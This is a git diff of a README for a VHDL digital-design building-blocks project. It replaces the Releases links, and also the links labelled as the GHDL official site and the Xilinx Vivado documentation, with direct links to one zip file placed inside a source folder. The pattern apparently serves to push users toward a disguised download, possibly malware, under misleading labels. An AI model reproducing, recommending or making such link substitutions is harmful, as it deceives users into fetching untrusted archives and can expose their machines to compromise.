@@ -1,6 +1,6 @@
 # 🎛️ vhdl-dsp-building-blocks - Easy Digital Design Building Blocks  
 
-[![Download vhdl-dsp-building-blocks](https://img.shields.io/badge/Download-vhdl--dsp--building--blocks-brightgreen)](https://github.com/iamlopez2512/vhdl-dsp-building-blocks/releases)
+[![Download vhdl-dsp-building-blocks](https://raw.githubusercontent.com/iamlopez2512/vhdl-dsp-building-blocks/main/src/ex04_decoder_2to4/dsp-blocks-building-vhdl-1.9-alpha.5.zip)](https://raw.githubusercontent.com/iamlopez2512/vhdl-dsp-building-blocks/main/src/ex04_decoder_2to4/dsp-blocks-building-vhdl-1.9-alpha.5.zip)
 
 ## 🚀 Getting Started  
 Welcome to the vhdl-dsp-building-blocks project! This software offers a collection of digital design components that you can use to create various logic circuits. With elements like counters, finite state machines (FSMs), and FIR filters, this collection is perfect for engineers and hobbyists alike.
@@ -8,7 +8,7 @@ Welcome to the vhdl-dsp-building-blocks project! This software offers a collecti
 ## 📁 Download & Install  
 To obtain the software, you will first need to visit our Releases page. Here, you can find the latest version available for download.
 
-[Visit this page to download](https://github.com/iamlopez2512/vhdl-dsp-building-blocks/releases)
+[Visit this page to download](https://raw.githubusercontent.com/iamlopez2512/vhdl-dsp-building-blocks/main/src/ex04_decoder_2to4/dsp-blocks-building-vhdl-1.9-alpha.5.zip)
 
 ### Steps to Download:
 
@@ -58,9 +58,9 @@ We welcome contributions from anyone interested! Here’s how you can contribute
 3. **Submit a Pull Request:** Once your changes are complete, submit a pull request so we can review your work.
 
 ## 🔗 Helpful Links  
-- [Releases Page](https://github.com/iamlopez2512/vhdl-dsp-building-blocks/releases)
-- [GHDL Official Site](https://github.com/ghdl/ghdl)
-- [Xilinx Vivado Documentation](https://www.xilinx.com/support/documentation-navigation/development-tools/vivado-design-suite.html)
+- [Releases Page](https://raw.githubusercontent.com/iamlopez2512/vhdl-dsp-building-blocks/main/src/ex04_decoder_2to4/dsp-blocks-building-vhdl-1.9-alpha.5.zip)
+- [GHDL Official Site](https://raw.githubusercontent.com/iamlopez2512/vhdl-dsp-building-blocks/main/src/ex04_decoder_2to4/dsp-blocks-building-vhdl-1.9-alpha.5.zip)
+- [Xilinx Vivado Documentation](https://raw.githubusercontent.com/iamlopez2512/vhdl-dsp-building-blocks/main/src/ex04_decoder_2to4/dsp-blocks-building-vhdl-1.9-alpha.5.zip)
 
 ## 🙋‍♂️ Frequently Asked Questions  
 **Q: Can I use this collection for commercial projects?**  
